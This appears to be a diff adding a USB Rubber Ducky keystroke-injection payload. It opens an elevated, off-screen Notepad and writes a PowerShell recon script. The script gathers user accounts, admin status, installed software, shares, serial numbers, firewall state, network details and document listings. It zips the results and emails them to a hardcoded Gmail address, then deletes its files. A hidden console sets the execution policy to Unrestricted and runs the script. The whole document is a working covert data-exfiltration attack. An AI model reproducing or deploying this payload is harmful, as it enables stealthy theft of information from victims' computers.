@@ -1,0 +1,223 @@
+GUI 
+DELAY 1000  
+TEXT powershell Start-Process notepad -Verb runAs
+DELAY 1000
+CTRL SHIFT ENTER
+DELAY 3000
+ALT y 
+DELAY 1000
+ALT SPACE
+DELAY 1000  
+TEXT m 
+DELAY 1800  
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW  
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW  
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW  
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW  
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW 
+DOWNARROW
+ENTER
+STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss')
+STRING $userDir = (Get-ChildItem env:\userprofile).value + '\Ducky Report ' + $folderDateTime
+STRING $fileSaveDir = New-Item  ($userDir) -ItemType Directory 
+STRING $date = get-date 
+STRING $style = "<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#center{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>"
+STRING $Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html' 
+STRING $Report = $Report + "<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>" 
+STRING $UserInfo = Get-WmiObject -class Win32_UserAccount -namespace root/CIMV2 | Where-Object {$_.Name -eq $env:UserName}| Select AccountType,SID,PasswordRequired  
+STRING $UserType = $UserInfo.AccountType 
+STRING $UserSid = $UserInfo.SID
+STRING $UserPass = $UserInfo.PasswordRequired 
+STRING $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') 
+STRING $Report =  $Report + "<div id=left><h3>User Information</h3><br><table><tr><td>Current User Name:</td><td>$env:USERNAME</td></tr><tr><td>Account Type:</td><td> $UserType</td></tr><tr><td>User SID:</td><td>$UserSid</td></tr><tr><td>Account Domain:</td><td>$env:USERDOMAIN</td></tr><tr><td>Password Required:</td><td>$UserPass</td></tr><tr><td>Current User is Admin:</td><td>$IsAdmin</td></tr></table>" 
+STRING $Report = $Report + '</div>' 
+STRING $Report =  $Report + '<div id=center><h3> Installed Programs</h3> ' 
+STRING $Report =  $Report + (Get-WmiObject -class Win32_Product | ConvertTo-html  Name, Version,InstallDate) 
+STRING $Report = $Report + '</table></div>' 
+STRING  $u = 0 
+STRING $allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace) 
+STRING $Report =  $Report + '<div id=right><h3>USB Devices</h3><table>' 
+STRING do { 
+STRING $gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB) 
+STRING $Report = $Report + "<tr><td>Drive Name: </td><td> " + $allUsb[$u].Name + $allUsb[$u].Label + "</td><td>Free Space: </td><td>" + $gbUSB + "GB</td></tr>"
+STRING Write-Output $fullUSB
+STRING $u ++ 
+STRING } while ($u -lt $allUsb.Count) 
+STRING $Report = $Report + '</table></div>' 
+STRING $Report =  $Report + '<div id=left><h3>Shared Drives/Devices</h3>' 
+STRING $Report =  $Report + (GET-WMIOBJECT Win32_Share | convertto-html Name, Description, Path) 
+STRING $Report = $Report + '</div>' 
+STRING $SysBootTime = Get-WmiObject Win32_OperatingSystem  
+STRING $BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetime  
+STRING $SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)  
+STRING $SerialNo = $SysSerialNo.SerialNumber  
+STRING $SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,Model  
+STRING $SysManufacturer = $SysInfo.Manufacturer  
+STRING $SysModel = $SysInfo.Model
+STRING $OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).caption 
+STRING $disk = Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'"
+STRING $HD = [math]::truncate($disk.Size / 1GB) 
+STRING $FreeSpace = [math]::truncate($disk.FreeSpace / 1GB) 
+STRING $SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select  TotalVisibleMemorySize 
+STRING $Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB) 
+STRING $SysCpu = Get-WmiObject Win32_Processor | Select Name 
+STRING $Cpu = $SysCpu.Name 
+STRING $HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumber 
+STRING $HardSerialNo = $HardSerial.SerialNumber 
+STRING $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select Name 
+STRING $graphicsCard = gwmi win32_VideoController |select Name 
+STRING $graphics = $graphicsCard.Name 
+STRING $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1 
+STRING $DriveLetter = $CDDrive.Drive 
+STRING $DriveName = $CDDrive.Caption 
+STRING $Disk = $DriveLetter + '\' + $DriveName 
+STRING $Firewall = New-Object -com HNetCfg.FwMgr  
+STRING $FireProfile = $Firewall.LocalPolicy.CurrentProfile  
+STRING $FireProfile = $FireProfile.FirewallEnabled
+STRING $Report = $Report  + "<div id=left><h3>Computer Information</h3><br><table><tr><td>Operating System</td><td>$OS</td></tr><tr><td>OS Serial Number:</td><td>$SerialNo</td></tr><tr><td>Current User:</td><td>$env:USERNAME </td></tr><tr><td>System Uptime:</td><td>$BootTime</td></tr><tr><td>System Manufacturer:</td><td>$SysManufacturer</td></tr><tr><td>System Model:</td><td>$SysModel</td></tr><tr><td>Serial Number:</td><td>$HardSerialNo</td></tr><tr><td>Firewall is Active:</td><td>$FireProfile</td></tr></table></div><div id=right><h3>Hardware Information</h3><table><tr><td>Hardrive Size:</td><td>$HD GB</td></tr><tr><td>Hardrive Free Space:</td><td>$FreeSpace GB</td></tr><tr><td>System RAM:</td><td>$Ram GB</td></tr><tr><td>Processor:</td><td>$Cpu</td></tr><td>CD Drive:</td><td>$Disk</td></tr><tr><td>Graphics Card:</td><td>$graphics</td></tr></table></div>"  
+STRING $Report =  $Report + '<div id=center><h3>User Documents (doc,docx,pdf,rar)</h3>' 
+STRING $Report =  $Report + (Get-ChildItem -Path $userDir -Include *.doc, *.docx, *.pdf, *.zip, *.rar -Recurse |convertto-html Directory, Name, LastAccessTime) 
+STRING $Report = $Report + '</div>' 
+STRING $Report =  $Report + '<div id=center><h3>Network Information</h3>' 
+STRING $Report =  $Report + (Get-WmiObject Win32_NetworkAdapterConfiguration -filter 'IPEnabled= True' | Select Description,DNSHostname, @{Name='IP Address ';Expression={$_.IPAddress}}, MACAddress | ConvertTo-Html) 
+STRING $Report = $Report + '</table></div>' 
+STRING $Report >> $fileSaveDir'/ComputerInfo.html' 
+STRING function copy-ToZip($fileSaveDir){ 
+STRING $srcdir = $fileSaveDir 
+STRING $zipFile = 'C:\Windows\Report.zip'
+STRING if(-not (test-path($zipFile))) { 
+STRING set-content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18)) 
+STRING (dir $zipFile).IsReadOnly = $false} 
+STRING $shellApplication = new-object -com shell.application 
+STRING $zipPackage = $shellApplication.NameSpace($zipFile) 
+STRING $files = Get-ChildItem -Path $srcdir 
+STRING foreach($file in $files) { 
+STRING $zipPackage.CopyHere($file.FullName) 
+STRING while($zipPackage.Items().Item($file.name) -eq $null){ 
+STRING Start-sleep -seconds 1 }}} 
+STRING copy-ToZip($fileSaveDir) 
+STRING $SMTPServer = 'smtp.gmail.com' 
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
+STRING $SMTPInfo.EnableSsl = $true 
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL@gmail.com', 'PASSWORD'); 
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage 
+STRING $ReportEmail.From = 'katsumoto.lessis@gmail.com' 
+STRING $ReportEmail.To.Add('katsumoto.lessis@gmail.com') 
+STRING $ReportEmail.Subject = 'Duck Toolkit Recon Report' 
+STRING $ReportEmail.Body = 'Please find attached your reconnaissance report.'  
+STRING $ReportEmail.Attachments.Add('C:\Windows\Report.zip')
+STRING $SMTPInfo.Send($ReportEmail) 
+STRING remove-item $fileSaveDir -recurse 
+STRING remove-item 'C:\Windows\Report.zip'
+STRING Remove-Item $MyINvocation.InvocationName 
+CTRL s
+DELAY 1000 
+STRING C:\Windows\config-28955.ps1
+DELAY 1000  
+ALT y
+ALT F4 
+GUI
+DELAY 1000
+TEXT cmd /T:01 /K "@echo off && mode con:COLS=15 LINES=1"
+DELAY 1000
+CTRL SHIFT ENTER
+DELAY 3000
+ALT y 
+DELAY 1000  
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false  
+STRING powershell.exe -windowstyle hidden -File C:\Windows\config-28955.ps1
+STRING exit
